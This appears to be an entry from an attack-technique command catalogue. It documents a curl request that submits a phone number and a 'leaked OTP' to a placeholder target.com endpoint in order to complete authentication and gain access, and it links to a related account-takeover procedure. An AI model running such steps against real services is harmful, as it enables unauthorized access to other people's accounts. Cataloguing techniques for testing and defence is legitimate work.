---
id: cmd-uuid-2
data: >-
  curl -X POST https://target.com/api/auth/verify -H "Content-Type:
  application/json" -d '{"phone": "+1234567890", "otp": "123456"}'
tags:
  - api
  - auth
type: command
output: '{"success": true, "token": "abc123"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.480Z'
verified: false
validated: true
submitted: true
---
# curl-complete-auth

## Command

```bash
curl -X POST https://target.com/api/auth/verify -H "Content-Type: application/json" -d '{"phone": "+1234567890", "otp": "123456"}'
```

## Description

Submits the phone number and leaked OTP to the verification endpoint to complete authentication and gain access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{"phone": "+1234567890", "otp": "123456"}'` | JSON payload with phone and OTP | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api/auth/verify -H "Content-Type: application/json" -d '{"phone": "+1234567890", "otp": "123456"}'
```

### Advanced Usage

```bash
curl -X POST https://target.com/api/auth/verify -H "Content-Type: application/json" -H "Authorization: Bearer temp-token" -d '{"phone": "+1234567890", "otp": "123456"}'
```

## Expected Output

Successful response with auth token, e.g., {"success": true, "token": "abc123", "user_id": 123}. Errors indicate invalid OTP.

## Related

- [[Related Procedure: Complete-Authentication-with-Leaked-OTP]]
